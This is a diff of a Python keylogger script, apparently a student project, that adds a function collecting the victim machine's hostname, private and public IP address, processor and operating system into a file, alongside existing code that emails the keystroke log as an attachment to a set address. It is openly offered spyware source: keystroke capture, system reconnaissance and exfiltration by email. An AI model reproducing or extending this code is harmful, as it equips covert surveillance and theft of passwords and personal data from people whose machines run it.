@@ -36,12 +36,16 @@ key_log = "log.txt"
 file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
 extend = "\\"
 
+
+# variable declarations for system info
+system_info = "system.txt"
+
 # variable declarations for keylog
 # count to check if key is pressed then written to, keys to hold the keys
 count = 0
 keys = []
 
-
+# sending email functionality 
 def send_email(filename, attachment, toaddr):
     from_addr = email_address
     msg = MIMEMultipart()
@@ -68,7 +72,28 @@ def send_email(filename, attachment, toaddr):
     s.quit()
 
 send_email(key_log, file_path + extend + key_log, to_addr)
- 
+
+# grabbing computer information function
+def comp_info():
+    with open(file_path + extend + system_info ,"a") as file:
+        hostname = socket.gethostname()
+        ip_addr = socket.gethostbyname(hostname)
+        # grabbing public ip address
+        try:
+            public_ip = get("https://api.ipify.org").text
+            file.write("Public IP Address: " + public_ip + "\n")
+        except Exception:
+            file.write("Public IP Address not found")
+
+        file.write("Processor: " + (platform.processor()) + "\n")
+        file.write("System: " + platform.system() + " " + platform.version() + "\n") 
+        file.write("Machine: " + platform.machine() + "\n")
+        file.write("Hostname: " + hostname + "\n")
+        file.write("Private IP Address: " + ip_addr)
+
+comp_info()
+
+# basic key logger functionality
 def on_press(key):
     global keys, count
 
